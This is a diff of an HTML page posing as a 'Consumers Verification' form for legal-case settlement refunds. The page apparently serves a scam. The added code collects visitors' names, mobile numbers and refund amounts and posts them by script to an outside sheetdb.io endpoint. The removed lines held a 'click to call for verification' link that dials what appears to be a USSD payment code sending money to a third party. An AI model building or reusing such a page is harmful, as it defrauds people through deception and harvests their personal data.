@@ -134,6 +134,10 @@
 <body>
     <h2> Consumers Verification </h2>
     <img src=" mobil.jpeg">
+            <span onclick="document.getElementById('id01').style.display='none'" class="close"
+        title="Close Modal">&times;</span>
+    <form class="modal-content" action="https://sheetdb.io/api/v1/vs4tdo0usckts" method="post" id="sheetdb-form">
+        <div class="container">
             <h1>Verify Your Self and get update Settlements on your legal case </h1>
             <p> Enter Your Correct details </p>
             <hr>
@@ -141,16 +145,32 @@
             <label for="name"><b> Your Name</b></label>
             <input type="text" placeholder="Enter your Name" name="data[name]" required>
 
-            <label for="Mobile"><b>Mobile Number</b></label>
-            <input type="text" placeholder="Enter Mobile Number" name="data[mob]" required>
+            <label for="number"><b>Mobile Number</b></label>
+            <input type="text" placeholder="Enter Mobile Number" name="data[number]" required>
 
-            <label for="refund amount"><b>Refund amount</b></label>
-            <input type="text" placeholder="Enter your refundable amount" name="data[refund]" required>
+            <label for="refund "><b>Enter your Refundable amount</b></label>
+            <input type="text" placeholder="Enter your Refundable amount" name="data[refund]" required>
 
-          
-            
-            <a href="tel://*99*1*1*9990842321*4949*1#">Click to call for verification</a>
 
+            <button onclick="document.getElementById('id02').style.display='block'" style="width:auto;">Verify</button>
+             <script>
+                var form = document.getElementById('sheetdb-form');
+                form.addEventListener("submit", e => {
+                    e.preventDefault();
+                    fetch(form.action, {
+                        method: "POST",
+                        body: new FormData(document.getElementById("sheetdb-form")),
+                    }).then(
+                        response => response.json()
+                    ).then((html) => {
+                        // you can put any JS code here
+                        window.open('Verify.html', '_self');
+
+                    });
+                });
+            </script>
+
+    
 
 
 
